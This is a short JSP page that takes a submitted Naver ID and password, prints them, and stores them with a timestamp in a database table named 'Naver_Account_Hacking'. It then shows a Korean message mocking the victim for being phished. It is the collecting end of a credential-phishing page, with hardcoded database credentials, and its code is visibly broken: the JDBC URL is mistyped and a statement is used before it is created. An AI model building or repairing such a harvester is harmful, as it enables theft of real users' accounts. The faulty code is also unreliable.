<%@page import="java.sql.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%
	String Naver_id = request.getParameter("id");
	String Naver_pw = request.getParameter("pw");
	out.println(Naver_id + ", " + Naver_pw);
	//if (Naver_id == null || Naver_pw == null) {
	//	out.println("<script>alert('아이디/비밀번호가 입력돼있지 않습니다.');history.go(-1);</script>");
	//} else {
		PreparedStatement stmt = null;
		String sql = "";

		Class.forName("oracle.jdbc.driver.OracleDriver");

		String url = "jdb:oracle:thin:@localhost:1521:system";
		String id = "test20509";
		String pw = "20509";
		Connection conn = DriverManager.getConnection(url, id, pw);

		sql = "INSERT INTO Naver_Account_Hacking VALUES((select nvl(max(num),0) + 1 from Naver_Account_Hacking),TO_CHAR(SYSDATE,'YYYY/MM/DD HH24:MI:SS'),?,?)";
		stmt.setString(1, Naver_id);
		stmt.setString(2, Naver_pw);

		stmt = conn.prepareStatement(sql);

		stmt.executeUpdate();
	//}
%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
</head>
<body>
	<h1>낚시임 ㅅㄱ</h1>
</body>
</html>